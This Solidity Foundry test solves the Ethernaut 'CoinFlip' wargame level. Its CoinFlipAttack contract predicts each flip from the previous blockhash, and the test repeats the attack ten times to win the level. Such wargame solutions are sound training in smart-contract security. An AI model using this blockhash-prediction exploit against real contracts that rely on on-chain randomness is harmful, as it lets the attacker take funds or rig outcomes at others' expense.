// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {CoinFlipFactory} from "../src/factories/CoinFlipFactory.sol";
import {CoinFlip} from "../src/levels/CoinFlip.sol";

import "forge-std/console.sol";

contract CoinFlipTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        CoinFlipFactory factory = new CoinFlipFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveCoinFlip() public {
        CoinFlip instance = CoinFlip(payable(levelAddress));

        // [START]

        // 1. Deploy attacker contract
        CoinFlipAttack attacker = new CoinFlipAttack(payable(levelAddress));

        // 2. Call attack 10 times
        for (uint256 i = 0; i < 10; i++) {
            attacker.attack();
            vm.roll(block.number + 1); // advance to next block
        }

        console.logUint(instance.consecutiveWins());

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

// Attack contract
contract CoinFlipAttack {
    CoinFlip public target;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        target.flip(side);
    }
}
